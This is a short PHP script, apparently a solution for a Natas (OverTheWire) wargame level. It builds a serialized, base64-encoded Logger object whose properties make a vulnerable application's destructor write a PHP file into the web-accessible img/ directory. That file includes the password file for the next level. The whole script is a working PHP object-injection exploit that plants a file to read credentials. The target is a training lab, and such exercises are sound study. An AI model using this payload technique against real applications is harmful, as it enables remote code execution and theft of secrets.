<?php

 class Logger{
        private $logFile = 'img/natas26_getpw.php';
        private $exitMsg = '<?php include("/etc/natas_webpass/natas27"); ?>';

        function log($msg){
            echo "log exMsg: " . $this->exitMsg . "\n";
        }
        function __destruct(){
            echo "destruct exMsg: " . $this->exitMsg . "\n";
        }
    }

$lg = new Logger();
$str = base64_encode(serialize($lg));
echo $str . "\n";
?>
